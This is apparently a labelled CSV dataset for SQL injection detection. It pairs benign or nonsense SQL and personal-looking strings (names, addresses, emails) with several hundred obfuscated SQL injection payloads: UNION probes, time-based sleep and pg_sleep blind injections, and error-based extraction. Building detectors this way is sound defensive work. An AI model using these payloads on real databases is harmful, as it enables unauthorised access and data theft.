Query,Label
"INSERT INTO attack ( fierce, manufacturing, tree, settlers, built, magnet )  VALUES  ( 'condition', 'journey'. difficult', 'gather', 'equator', 'shade', 'giant' )",0
23130,0
82751097h,0
"SELECT * FROM heavy WHERE part BETWEEN ""deer"" AND    ""eleven""",0
SELECT * FROM heart,0
SELECT able ( s )  FROM explore UNION ALL,0
SELECT * FROM  ( SELECT slide FROM shout ),0
"SELECT Orders.animalrID, Employees.pride, Employees.snow FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.smallID ORDER BY Orders.listenID",0
"SELeCt dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   froM dual anD   (  ""eboa"" lIKe ""eboa",1
SELECT * FROM farm WHERE fruit IN  ( SELECT about FROM getting ),0
desortija0a,0
28721,0
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0
alfredo calderon 136,0
70679983v,0
ohala,0
SELECT * FROM grandfather WHERE party = 'family' LIMIT 3,0
"1""  )   )	) unionallselect	null,null,null,null--",1
1%20%20%29%20%20/%2A%21where%2A/7165%20%20%3D%20%207165%20%26%26/%2A%21sleep%2A/%20%28%20%205%20%20%29%20%20%23,1
"-3315""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/uNIOn/**/ALl/**/sELeCt/**/2457,2457,2457,2457,2457,2457--",1
"1"") /*!||*/	(/*!select*/*/*!from*/ (/*!select*/( /*!sleep*/(	5   ) 	)	  	) ydpu)/*!&&*/	(	""gixv"" =	""gixv",1
SELECT * FROM card WHERE eat NOT BETWEEN 'happily' AND 'check',0
1'||/**//**/(/**//**//*!select*//**/'puco'/**//*!where*//**/2605/**//*!LIKE*//**/2605/**//*!union*//**//*!all*//**//*!select*//**//*!null*/#,1
kin-yee,0
SELECT * FROM rope WHERE making = 'spring' LIMIT 3,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20ipfy%20where%201189%20%20%3D%20%201189,1
"sELECt	*/*!FROm*/users/*!whERe*/id	=1/*!oR*/""{  )  ""/*!oR*/1=1 --1",1
"select/**/*/**/from/**/users/**/where/**/id/**//**/=/**//**/'1'/**/union/**/select/**/!<@,version/**//**/(/**//**//**//**/)/**//**//**/--/**/1'",1
cado,0
inciertamente,0
"SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )",0
1%27%20where%208749%20%20%3D%20%208749%20or%208421%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20--,1
"SELECT * FROM here WHERE gun NOT IN  ( 'power', 'shorter', 'sound' )",0
14860,0
"1 && elt  (  4249 LIKE 4249,7259  )",1
"-8614'/**//**/)/**//**//**//*!or*//**/1/**//*!group*//**//*!by*//**/concat/**//**/(/**//**/0x7171706a71,/**//**/(/**//**//*!select*//**//**//**/(/**//**//*!case*//**//*!when*//**//**//**/(/**//**/4232/**//**/=/**//**/4232/**//**/)/**//**//**//*!then*//**/1/**//*!else*//**/0/**//*!end*//**//**//**/)/**//**//**//**/)/**//**//**/,0x717a767a71,floor/**//**/(/**//**/rand/**//**/(/**//**/0/**//**/)/**//**/*2/**//**//**/)/**//**//**//**/)/**//**//**//**//*!having*//**/min/**//**/(/**//**/0/**//**/)/**//**/#",1
SELECT * FROM forth WHERE Price NOT BETWEEN 10 AND 20,0
1  )  /*!as*/ozga/*!where*/4002/*!LIKE*/4002/*!and*/6969/*!LIKE*/( /*!select*/6969/*!from*/pg_sleep  (  5   )    )   --,1
%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20srmq%20%20%29%20%20%20%26%26%20%22plqe%22%20%20%3D%20%20%22plqe,1
maggee,0
sElEct 	(/*!Case*//*!wHEN*/(  1005 	=	5996)	/*!thEN*/1/*!elSe*/1005*(	/*!sElEct*/1005/*!fROM*/master..sysdatabases  )/*!EnD*/	) --,1
paseo arco del ladrillo 48 10?h,0
SELECT AVG ( Price ) FROM imagine,0
cr48e24n,0
"SELECT skill,bar,goes FROM seen LEFT JOIN Orders ON balloon.builtID =  shade.married ORDER BY scientist.half",0
SELECT COUNT ( whale )  FROM chamber,0
SELECT * FROM attention FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM hay,0
SELECT * FROM population ORDER BY page DESC,0
"SELECT INSTR ( ""W3Schools.com"", ""3"" )  AS MatchPosition;",0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_wp_stateless_google_sdk_conflict' LIMIT 1,0
1%22%20%20%29%20%20%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20%20and%20%20%20%28%20%20%22fbqy%22%20like%20%22fbqy,1
1 ) 	 	) )		AnD ( SeLEct*fRoM(	SeLEct(SLEeP( 5	)	) 	 )gcrr  )	 #,1
FROM  ( SELECT DISTINCT house FROM shelf ),0
5719,0
SELECT Count ( * )  AS wet,0
SELECT meet ( s FROM avoid RIGHT JOIN,0
SELECT return ( s FROM muscle RIGHT JOIN,0
-9120'   )    )    || 8571  =  8571--,1
1%C2%A0%C2%A0%29%0C%09%C2%A0as%0Bvzyk%0Cwhere%095103%0C%0B%3D%0C%C2%A05103%0B%26%26%0C8312%0C%C2%A0%3D%C2%A0%0Bdbms_pipe.receive_message%09%09%28%0B%0Cchr%C2%A0%C2%A0%28%09%0969%C2%A0%0B%29%09%0C%7C%7Cchr%09%09%28%0B%0B79%09%09%29%C2%A0%C2%A0%7C%7Cchr%C2%A0%C2%A0%28%0B%09101%0C%09%29%0C%0B%7C%7Cchr%0C%09%28%0C%0968%0C%0B%29%09%0C%2C5%0C%C2%A0%29%0C%C2%A0--,1
-8684'/**//*!wHErE*//**/9820/**//**/=/**//**/9820/**//*!or*//**/6844/**//**/=/**//**/5105,1
SELECT * FROM plus WHERE close BETWEEN 'army' AND 'thee',0
SELECT cell ( s )  FROM forest LEFT JOIN,0
34578974s,0
SELECT * FROM rather WHERE explain = 'known'  OR circus = 'thirty',0
"c/ costa verde, 100 4c",0
SELECT * FROM bone FETCH FIRST 3 ROWS ONLY,0
"1%""/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**//*!union*//**//*!all*//**//*!select*//**//*!null*/#",1
1%20where%206434%20%20%3D%20%206434,1
SELECT * FROM never WHERE settle NOT LIKE 'organized%',0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_timeout_houzez_verification_success' LIMIT 1,0
"1""	  )		)  /*!union*//*!all*//*!select*/	/*!null*/--",1
"SELECT bow, ago, tears FROM neighbor WHERE locate  IS NULL",0
SELECT AVG ( Price ) FROM accept,0
"sEleCt	LIKe	( 'abcdefg',upper	( hex (	randomblob 	(	 500000000/2 )		)  	) )	AnD  (	 ( 'nimx'		=  'nimx",1
"1'||  ( /*!select*/'xyrk'/*!from*/dual/*!where*/9844/*!LIKE*/9844/*!and*/9254/*!LIKE*/( /*!select*/count  (  *  )  /*!from*/rdb$fields/*!as*/t1,rdb$types/*!as*/t2,rdb$collations/*!as*/t3,rdb$functions/*!as*/t4  )  --",1
1'  )  /*!whERe*/4729 LIKE 4729,1
seLEct%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%3B.%22%20%20%3D%20%201%20or%201%20%20%3D%20%201%20--%201,1
SELECT * FROM it WHERE native BETWEEN 'milk' AND 'sitting',0
"1""/*!and*/4241/**//**/=/**//*!convert*//**/(/**//**/int,/**//**/(/**//*!select*//*!char*//**/(/**//**/113/**//**/)/**//**/+/*!char*//**/(/**//**/113/**//**/)/**//**/+/*!char*//**/(/**//**/112/**//**/)/**//**/+/*!char*//**/(/**//**/106/**//**/)/**//**/+/*!char*//**/(/**//**/113/**//**/)/**//**/+/**//**/(/**//*!select*//**//**/(/**//*!case*//*!when*//**//**/(/**//**/4241/**//**/=/**//**/4241/**//**/)/**//**//*!then*//*!char*//**/(/**//**/49/**//**/)/**//**//*!else*//*!char*//**/(/**//**/48/**//**/)/**//**//*!end*//**//**/)/**//**//**//**/)/**//**//**/+/*!char*//**/(/**//**/113/**//**/)/**//**/+/*!char*//**/(/**//**/122/**//**/)/**//**/+/*!char*//**/(/**//**/118/**//**/)/**//**/+/*!char*//**/(/**//**/122/**//**/)/**//**/+/*!char*//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)",1
call%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
||	useridlike '%,1
-5569%27%20%20%29%20%20%20as%20cjaf%20where%203753%20%20%3D%20%203753%20union%20all%20select%203753%23,1
"1	)	)as npdlwhere5796	=5796&&3707		=	 (select count( *	 )  fromsysibm.systables as	t1,sysibm.systables	as	t2,sysibm.systablesas	t3	) --",1
3.79218E+15,0
9270,0
SELECT * FROM grain FETCH FIRST 3 ROWS ONLY,0
"-7139""/**/	) 	 /*!where*/2723		=2723	/*!or*/3900	= 	5082--",1
6721,0
SELECT COUNT ( betweenID ) FROM active,0
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,0
"-2013""/**//**//**/)/**//**//**//**/)/**//**//**//**/as/**/kisy/**/where/**/3802/**//**/ LIKE /**//**/3802/**/||/**/5903/**//**/ LIKE /**//**//**//**/(/**//**/'qqpjq'||/**//**/(/**//**/select/**/case/**/5903/**/when/**/5903/**/then/**/1/**/else/**/0/**/end/**/from/**/rdb$database/**//**/)/**//**/||'qzvzq'/**//**/)/**//**/--",1
"-4605""/**//**/)/**//**//**/uniON/**/ALL/**/SelECt/**/8542,8542,8542,8542,8542,8542,8542,8542--",1
hollywood.hausman@921.th,0
SELECT * FROM list WHERE tin = 'toy',0
"1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/anD/**/4241/**//**/ LIke /**//**/coNvERT/**//**/(/**//**/int,/**//**/(/**//**/SELECT/**/ChAR/**//**/(/**//**/113/**//**/)/**//**/+ChAR/**//**/(/**//**/113/**//**/)/**//**/+ChAR/**//**/(/**//**/112/**//**/)/**//**/+ChAR/**//**/(/**//**/106/**//**/)/**//**/+ChAR/**//**/(/**//**/113/**//**/)/**//**/+/**//**/(/**//**/SELECT/**//**//**/(/**//**/cASE/**/whEN/**//**//**/(/**//**/4241/**//**/ LIke /**//**/4241/**//**/)/**//**//**/tHeN/**/ChAR/**//**/(/**//**/49/**//**/)/**//**//**/ELSE/**/ChAR/**//**/(/**//**/48/**//**/)/**//**//**/eNd/**//**//**/)/**//**//**//**/)/**//**//**/+ChAR/**//**/(/**//**/113/**//**/)/**//**/+ChAR/**//**/(/**//**/122/**//**/)/**//**/+ChAR/**//**/(/**//**/118/**//**/)/**//**/+ChAR/**//**/(/**//**/122/**//**/)/**//**/+ChAR/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**//**/anD/**//**//**//**/(/**//**//**//**/(/**//**//**//**//**/(/**//**/9184/**//**/ LIke /**//**/9184",1
2.21E+15,0
eddier,0
SELECT * FROM apple WHERE Price NOT BETWEEN 10 AND 20,0
-7016%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208847%2C8847%2C8847--,1
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20and%203228%20%20%3D%20%207376%23,1
"1""	  ) 	) 	AS maxe	WHeRe5883= 5883uNioN All sELECtNulL,NulL,NulL,NulL,NulL,NulL,NulL,NulL,NulL#",1
SELECT * FROM brush FETCH FIRST 50 PERCENT ROWS ONLY,0
rhett,0
"SElECT count  (  *  )   FROM domain.domains AS t1,domain.columns AS t2,domain.tables AS t3 &&   (  ""%""  =  """,1
InsERt,1
-4219'/**/or/**/2724/**/in/**//**//**//**/(/**//**//**//**/(/**//**//**/char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/112/**//**/)/**//**/+char/**//**/(/**//**/106/**//**/)/**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+/**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/2724/**//**/ LIKE /**//**/2724/**//**/)/**//**//**/then/**/char/**//**/(/**//**/49/**//**/)/**//**//**/else/**/char/**//**/(/**//**/48/**//**/)/**//**//**/end/**//**//**/)/**//**//**//**/)/**//**//**/+char/**//**/(/**//**/113/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/118/**//**/)/**//**/+char/**//**/(/**//**/122/**//**/)/**//**/+char/**//**/(/**//**/113/**//**//**/)/**//**//**//**/)/**//**//**//**//**/),1
1%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%205840%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205840%20%20%3D%20%205840%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%2C1%20%20%29%20%20--%20dtha,1
"calle santa teresa, 87 5?b",0
"SELECT examine,judge FROM position WHERE book = 'deep' UNION SELECT poetry, skin FROM school",0
"1 )	WHerE	2679 =  2679 ||4915 	= 	(SELECTcount		(	*)	Fromdomain.domains	As t1,domain.columns Ast2,domain.tables As	t3 	)--",1
or ''^',1
1'+/**//**/(/**//*!select*/idnb/*!where*/2338/*!LIKE*/2338,1
"1""/**/where/**/9173/**//**/=/**//**/9173/**/rlike/**//**//**/(/**//**/select/**//**//**/(/**//**/case/**/when/**//**//**/(/**//**/7689/**//**/=/**//**/7689/**//**/)/**//**//**/then/**/1/**/else/**/0x28/**/end/**//**//**/)/**//**//**//**/)/**//**//**/--",1
SELECT front ( s )  FROM remove LEFT JOIN,0
ostapchuk casal,0
28670,0
"c/ salvatella, 98 11?h",0
"1'/*!&&*/elt(4249 	= 4249,7259 	) 	/*!&&*/	'nsbj'	/*!like*/'nsbj",1
SELECT * FROM standard WHERE    NOT nature = 'anyway',0
"1'   )    )    AS lrnh wheRE 8569 lIKe 8569 UNiON All SElECT nUlL,nUlL,nUlL,nUlL,nUlL--",1
maestro vitoria 10,0
"1"" && 6969  =    ( /*!select*/6969/*!from*/pg_sleep  (  5   )    )    && ""twmy""  =  ""twmy",1
vargas bentos,0
select/%2A%21sleep%2A/%20%28%20%205%20%20%29%20%20/%2A%21and%2A/%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22lczw%22%20LIKE%20%22lczw,1
1'/**//**//**/)/**//**//**//**/)/**//**//**//**/OR/**//**//**/(/**//**/sELEct/**/*/**/from/**//**//**/(/**//**/sELEct/**//**/(/**//**/SLeEp/**//**/(/**//**/5/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/ydpu/**//**/)/**//**//**/ANd/**//**//**//**/(/**//**//**//**/(/**//**//**/'ytxg'/**//**/=/**//**/'ytxg,1
SELECT * FROM personal WHERE Price NOT BETWEEN 10 AND 20,0
"-4148%""/**/)	  ) )		OR	(	8459=8459 )	*4906and (   (  (""%""	= """,1
latin,0
"calle hemingway, s/n",0
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',0
yuvia,0
SELECT buy,0
SELECT * FROM sitting FETCH FIRST 50 PERCENT ROWS ONLY,0
"garrotxa, 118",0
grimm@madrid2012.nu,0
giertych,0
SELECT * FROM back FETCH FIRST 50 PERCENT ROWS ONLY,0
"-5322""/*!union*//*!all*//*!select*/6494,6494,6494,6494,6494,6494--",1
)  /*!or*/pg_sleep  (  __TIME__  )  --,1
"1""/**//**/)/**//**//**/or/**/updatexml/**//**/(/**//**/1808,concat/**//**/(/**//**/0x2e,0x7171706a71,/**//**/(/**//**/select/**//**//**/(/**//**/elt/**//**/(/**//**/1808/**/LIKE/**/1808,1/**//**//**/)/**//**//**//**/)/**//**//**//**//**/)/**//**/,0x717a767a71/**//**/)/**//**/,8666/**//**/)/**//**//**/and/**//**//**/(/**//**/""igop""/**/LIKE/**/""igop",1
%23/%2A%21from%2A/wapiti,1
clarucha,0
SELECT mostly FROM expect UNION ALL SELECT related FROM finish ORDER BY pipe,0
SELECT * FROM amount WHERE    NOT factory = 'school',0
raudres,0
"1  )/*!as*/iuje/*!where*/1976 LIKE 1976/*!and*/6537 LIKE dbms_pipe.receive_message	( chr	(76) ||chr(  116) ||chr(117)	||chr 	(	65),5 )--",1
calle federico mompou 144 11-d,0
SELECT sheet ( s ) FROM loss INNER JOIN,0
1%27%2B%20%20%28%20%20select%20wkay%20where%205476%20%20%3D%20%205476%20and%20char%20%20%28%20%20120%20%20%29%20%20%7C%7Cchar%20%20%28%20%20106%20%20%29%20%20%7C%7Cchar%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%209981%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
1') 	/*!as*/wtev	/*!where*/ 5283	= 5283,1
su0r6s09,0
SELECT COUNT ( problemID ) FROM pound,0
1%25%27%20%26%26%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20%26%26%20%27%25%27%20%20%3D%20%20%27,1
"-1684""   )    )     )  /*!union*//*!all*//*!select*/7473,7473#",1
4.29127E+15,0
babasaki,0
bayuca,0
,1
-2505'/**/or/**/9323/**//**/=/**//**/9323#,1
"1',  (  select   (  case when   (  5777 LIKE 5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )",1
"1""/**/ 	)		 )				asbosqwhere4695 LIKE 4695",1
"SELECT stock, end+ ', ' + difficult+ ' ' + everybody+ ', ' + exercise AS doing  FROM graph",0
"INSERT INTO locate ( nose, fellow, heard, dance, angle, recall )  VALUES  ( 'period', 'laugh'. collect', 'world', 'including', 'under', 'traffic' )",0
-2912%27%C2%A0%0C%0C%29%C2%A0%09%09%09%29%09%0C%C2%A0%0Border%09by%C2%A01--,1
1emat98,0
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0
"1'/**/		)   	) /*!or*/4411=  (/*!select*/count  (		*	) /*!from*/sysusers/*!as*/sys1,sysusers/*!as*/sys2,sysusers/*!as*/sys3,sysusers/*!as*/sys4,sysusers/*!as*/sys5,sysusers/*!as*/sys6,sysusers/*!as*/sys7	)		/*!and*/ (	(	'holo' = 'holo",1
25330,0
winstanley@waterflyesp.hn,0
"select* from generate_series(  7754,7754,casewhen	( 7754 LIKE 1252)	then 1	else0end	 )	limit1--",1
lorletha,0
"SELECT yourselfID AS ID, highest AS break FROM sad",0
busoms redolad,0
"SELECT * FROM stand ORDER BY equipment, from",0
tordera savall,0
SELECT TOP 3 * FROM hall WHERE difficulty = 'outer',0
buchel-alymer@gemas.org.bu,0
SELECT AVG ( Price ) FROM gift,0
SELECT AVG ( hand )  FROM final  SELECT SUM ( slope ),0
"1""/**/WheRe/**/9332/**//**/=/**//**/9332/**/UNIOn/**/aLL/**/SELeCt/**/nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL,nULL--",1
suchet@ciaplast.tel,0
UPDATE later SET judge = 'level'WHERE history = 'lie',0
SELECT * FROM raw  WHERE glass = sentence,0
SELECT * FROM laugh,0
SELECT * FROM congress 3 SELECT * FROM page,0
18011,0
SELECT * FROM frozen WHERE fog = 'raw'  AND City = 'soap',0
alconchel,0
UPDATE toy SET breath = 'consider'WHERE color = 'handsome',0
1%22%20%20%29%20%20%20as%20uyns%20where%204751%20LIKE%204751%20%26%26%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20fzno%20%20%29%20%20--,1
SELECT * FROM Customers WHERE Country = 'Germany' FETCH FIRST 3 ROWS ONLY;,0
"SELECT back AS himself, sand AS [clay]  FROM shelter",0
1   )    )   /*!As*/xoch/*!wHeRe*/8765 LIKE 8765/*!and*/3754 LIKE ( /*!seLEct*/upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  ( /*!seLEct*/  ( /*!case*//*!wHEN*/  (  3754 LIKE 3754  )  /*!tHEn*/1/*!else*/0/*!enD*/ )  /*!frOM*/dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )  /*!frOM*/dual  )  --,1
74132716j,0
"1%'		 )   ) ) || 4411	=	(	selectcount(		* ) from sysusersas sys1,sysusers assys2,sysusers assys3,sysusersassys4,sysusersas sys5,sysusersassys6,sysusersassys7  ) 	 &&   ( ( 	(	'%' ='",1
"-6359""	)	 ) ||elt	(		3546 = 2433,2433	)   &&   	((""qxat"" =""qxat",1
SELECT * FROM lake WHERE stuck = 'won',0
"select */*!from*/users/*!where*/id/*!LIKE*/1/*!or*/""  (  _""/*!or*/1/*!LIKE*/1--1",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0
SELECT TOP 3 * FROM at WHERE loud = 'shop' SELECT * FROM actually,0
SELECT * FROM strong WHERE NOT swam = 'from'  AND NOT deal = 'cloth',0
sELecT   ( /*!CASE*//*!whEn*/  (  8978  =  1426  )  /*!THEn*/1/*!Else*/8978*  ( /*!sELecT*/8978/*!frOM*/master..sysdatabases  )  /*!enD*/ )  --,1
SELECt   ( /*!cAse*//*!WHEN*/  (  3336  =  9781  )  /*!then*/3336/*!ELsE*/1/  ( /*!SELECt*/0  )  /*!end*/ )  --,1
"-8640/**//**/)/**//**//**//*!or*//**/elt/**//**/(/**//**/7657/**//**/ LIKE /**//**/5020,5020/**//**/)/**//**//**//*!and*//**//**//**/(/**//**/2346/**//**/ LIKE /**//**/2346",1
"SELECT general,ourselves,farther FROM vowel LEFT JOIN Orders ON lift.continuedID =  cattle.trip ORDER BY bent.respect",0
vilma,0
7.85716E+15,0
vir7eino,0
-9884%27%20%20%29%20%20/%2A%21%7C%7C%2A/elt%20%20%28%20%201942%20%20%3D%20%208409%2C8409%20%20%29%20%20/%2A%21%26%26%2A/%20%20%28%20%20%27tqdq%27/%2A%21like%2A/%27tqdq,1
follosas,0
SELECT * FROM Customers  WHERE    NOT Country = 'Germany';,0
severiano,0
SELECT COUNT ( purpleID ) FROM why,0
colvin@freemachine.no,0
02314635f,0
1%27%7C%7C%20%20%28%20%20SElect%20%27jslz%27%20wHERE%208405%20%20%3D%20%208405%20rlike%20%20%20%28%20%20SElect%20%2A%20fROm%20%20%20%28%20%20SElect%20%20%28%20%20sleEp%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sgvo%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
SELECT * FROM sitting  WHERE come = cotton,0
invo3unta6i5,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
"SELECT * FROM tall ORDER BY education, greater",0
1%25%22%20union%20all%20select%20null--,1
UPDATE would SET through = 'wrapped'WHERE family = 'film',0
DELETE FROM growth,0
koprulu,0
SELECT COUNT ( DISTINCT flight )  FROM neighbor,0
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0
"1%'	 ) 	) 		)/*!and*/9660=		 (/*!select*/count	(*) /*!from*/all_userst1,all_userst2,all_userst3,all_userst4,all_users	t5 	)	--",1
"isabelita ruiz, 31",0
select%20%2A/%2A%21from%2A/users/%2A%21where%2A/id%20%20%3D%20%20%271%27%20%2B%20%20%20%28%20%20%5C%20%20%29%20%20/%2A%21union%2A//%2A%21select%2A/1%2C%40%40/%2A%21VERSION%2A/--%201%27,1
tarasova_dabo@comerciosdeaspe.ly,0
-7779'  )  /*!WHeRe*/4976  =  4976/*!||*/6872  =  6872--,1
"SELECT * FROM family ORDER BY south, angle",0
SELECT Count ( * )  AS already,0
1%27%20where%205819%20%20%3D%20%205819%20and%20%20%20%28%20%201275%20%20%3D%20%204759%20%20%29%20%20%2A4759--,1
"1'/**/	 )	 ) || ( select 2*	(if  ( 			( 		select*from	( selectconcat( 0x7171706a71,		( select 	( elt ( 8113=8113,1 	) 	)	 	 ),0x717a767a71,0x78	 )  	) s	 ),	8446744073709551610,	8446744073709551610)  ) 	)	  &&(	 ( 'nlnk'like'nlnk",1
SELECT difference,0
"-7267	) 		/*!union*//*!all*/ /*!select*/1912,1912,1912,1912,1912,1912,1912,1912--",1
FROM  ( SELECT DISTINCT strange FROM area ),0
"SelECT/**/count/**//**/(/**//**/*/**//**/)/**//**//**/frOM/**/all_users/**/t1,all_users/**/t2,all_users/**/t3,all_users/**/t4,all_users/**/t5--/**/mkoo",1
SELECT COUNT ( worthID ) FROM mirror,0
1%27%7C%7C%20%20%28%20%20sElect%20%27lstx%27%20FRoM%20dual%20WHErE%202972%20%20%3D%20%202972%20%7C%7C%204411%20%20%3D%20%20%20%20%28%20%20sElect%20count%20%20%28%20%20%2A%20%20%29%20%20%20FRoM%20sysusers%20aS%20sys1%2Csysusers%20aS%20sys2%2Csysusers%20aS%20sys3%2Csysusers%20aS%20sys4%2Csysusers%20aS%20sys5%2Csysusers%20aS%20sys6%2Csysusers%20aS%20sys7%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
SELECT TOP 3 * FROM only SELECT * FROM breathe 3SELECT * FROM wide,0
-1275%22%20union%20all%20select%207861%2C7861%2C7861%2C7861%2C7861%23,1
SELECT * FROM somewhere 3 SELECT * FROM damage,0
1'	)	  ) 	&&6969LIKE(		select6969frompg_sleep (5	 ) 	)  &&		 ( (	'prjf'LIKE 'prjf,1
-1304%27%20%20%29%20%20%20union%20all%20select%207639%23,1
"calle pea 49, 9?b",0
"SELECT column_name ( s )  FROM suggest,had",0
SELECT far FROM high UNION SELECT old FROM purple ORDER BY similar,0
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
dorene6,0
arrazua-ubarrundia,0
SELECT COUNT ( respectID ) FROM pressure,0
erill,0
